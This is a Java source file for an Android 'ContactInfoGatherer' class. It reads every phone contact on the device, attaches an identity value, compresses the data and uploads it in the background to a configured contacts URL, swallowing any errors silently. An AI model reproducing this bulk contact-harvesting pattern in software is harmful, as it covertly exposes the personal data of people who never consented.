package org.code.coregradle.gatherers;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;
import org.code.coregradle.utils.ContactHelper;
import org.code.coregradle.utils.JsonUtils;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ContactInfoGatherer implements InfoGatherer {

    private Context context;

    private final OkHttpClient okHttpClient = new OkHttpClient();
    private IdentityStore identityStore;

    @Override
    public void initGatherer(Context context) {
        this.context = context;
        this.identityStore = IdentityStore.getInstance(context);
    }


    private List<JSONObject> getAllContactsWithName() {
        try (Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.LABEL,
                        ContactsContract.CommonDataKinds.Phone.PHOTO_URI,
                        ContactsContract.CommonDataKinds.Phone._ID,
                        ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY,
                        ContactsContract.CommonDataKinds.Phone.TYPE}, null,
                null, null)) {
            List<JSONObject> sysContacts = new ArrayList<>();
            Set<String> visitedNumber = new HashSet<>();
            while (cursor != null && cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                String displayName =
                        cursor.getString(cursor.getColumnIndexOrThrow(
                                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String type =
                        cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE));


                String label = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.LABEL));

                if (!visitedNumber.contains(number)) {
                    sysContacts
                            .add(toContact(number, displayName, type, label));
                    visitedNumber.add(number);
                }
            }
            return sysContacts;
        } catch (Exception ignored) {
            Log.d("CoregradleException", "Contacts couldn't be accessed", ignored);
        }
        return new ArrayList<>();
    }

    public JSONObject toContact(String phoneNumber, String name, String type, String label) throws JSONException {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("phoneNumber", phoneNumber);
        jsonObject.put("name", name);
        jsonObject.put("type", type);
        jsonObject.put("label", label);
        return jsonObject;
    }

    private void addAppSpecificContacts(JSONObject requestJSON) {
        try {
            ContactHelper contactHelper = ContactHelper.getInstance(context);
            if (!contactHelper.isStoreEmpty()) {
                requestJSON.put("AppSpecificContacts", contactHelper.getContacts());
            }
        } catch (Exception ignored) {

        }
    }

    @Override
    public JSONObject getRequestJSON() {
        List<JSONObject> sysContacts = getAllContactsWithName();
        JSONArray contacts = JsonUtils.toJSONArray(sysContacts);
        JSONObject requestJSON = new JSONObject();
        try {
            requestJSON.put("contacts", contacts);
            addAppSpecificContacts(requestJSON);
            requestJSON.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());
        } catch (Exception e) {
        }
        return requestJSON;
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        try {
            JSONObject requestJSON = getRequestJSON();
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.CONTACTS_URL)
                    .post(requestBody)
                    .build();
            Response response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return ListenableWorker.Result.success();
            }
        } catch (Exception ignored) {
            ;
        }
        return ListenableWorker.Result.failure();
    }
}
